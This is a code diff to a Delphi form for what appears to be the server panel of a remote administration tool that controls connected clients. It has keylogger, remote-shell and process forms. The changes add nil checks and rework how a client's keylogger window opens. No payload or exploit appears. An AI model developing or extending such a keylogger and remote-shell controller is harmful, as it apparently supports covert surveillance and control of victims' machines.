@@ -122,7 +122,8 @@ begin
   if Assigned(FServerManager) then
   begin
     FServerManager.Stop;
-    FreeAndNil(FServerManager);
+    FServerManager.Free;
+    FServerManager := nil;
   end;
   inherited;
 end;
@@ -367,7 +368,12 @@ begin
   else
     AddOrUpdateListView(Info);
 
-  TThread.Queue(nil, procedure begin UpdateStatusBar; end);
+  TThread.Queue(nil,
+    procedure
+    begin
+      if not Assigned(FServerManager) then Exit;
+      UpdateStatusBar;
+    end);
 end;
 
 procedure TForm1.OnClientUpdated(const Info: TClientInfo);
@@ -385,7 +391,12 @@ procedure TForm1.OnClientDisconnected(aLine: TncLine);
 begin
   if not Assigned(FServerManager) then Exit;
   RemoveFromListView(aLine);
-  TThread.Queue(nil, procedure begin UpdateStatusBar; end);
+  TThread.Queue(nil,
+    procedure
+    begin
+      if not Assigned(FServerManager) then Exit;
+      UpdateStatusBar;
+    end);
   FServerManager.UnregisterInfoForm(aLine);
   FServerManager.UnregisterProcessForm(aLine);
   FServerManager.UnregisterRemoteShellForm(aLine);
@@ -470,6 +481,7 @@ begin
       Item: TListItem;
       i: Integer;
     begin
+      if not Assigned(FServerManager) then Exit;
       Item := nil;
       for i := 0 to ListView1.Items.Count - 1 do
         if TncLine(ListView1.Items[i].Data) = Info.LineHandle then
@@ -596,7 +608,10 @@ var
   SelectedLine: TncLine;
   LInfo       : TClientInfo;
   F7          : TForm7;
+  ClientID    : string;
 begin
+  if (FServerManager = nil) or (csDestroying in ComponentState) then Exit;
+
   if ListView1.Selected = nil then
   begin
     MessageBox(Handle, 'Lutfen once bir client secin.', 'Keylogger',
@@ -613,26 +628,22 @@ begin
   end;
 
   F7 := FServerManager.GetKeyloggerForm(SelectedLine);
-  if Assigned(F7) then
+
+  ClientID := 'Unknown';
+  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
+    ClientID := LInfo.ID;
+
+  if not Assigned(F7) then
   begin
-    F7.Show;
-    F7.BringToFront;
-    Exit;
+    F7 := TForm7.Create(Application);
+    FServerManager.RegisterKeyloggerForm(SelectedLine, F7);
   end;
 
-  F7 := TForm7.Create(Application);
-
-  if FServerManager.TryGetClientInfo(SelectedLine, LInfo) then
-    F7.SetupForClient(SelectedLine, LInfo.ID,
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterKeyloggerForm)
-  else
-    F7.SetupForClient(SelectedLine, 'Unknown',
-                      FServerManager.SendJSON,
-                      FServerManager.UnregisterKeyloggerForm);
-
-  FServerManager.RegisterKeyloggerForm(SelectedLine, F7);
+  F7.SetupForClient(SelectedLine, ClientID,
+                    FServerManager.SendJSON,
+                    FServerManager.UnregisterKeyloggerForm);
   F7.Show;
+  F7.BringToFront;
 end;
 
 //bağlantısı kopan etc. clientleri listview1'den silen fonksiyon.
@@ -643,6 +654,7 @@ begin
     var
       i: Integer;
     begin
+      if not Assigned(FServerManager) then Exit;
       for i := ListView1.Items.Count - 1 downto 0 do
         if TncLine(ListView1.Items[i].Data) = aLine then
         begin
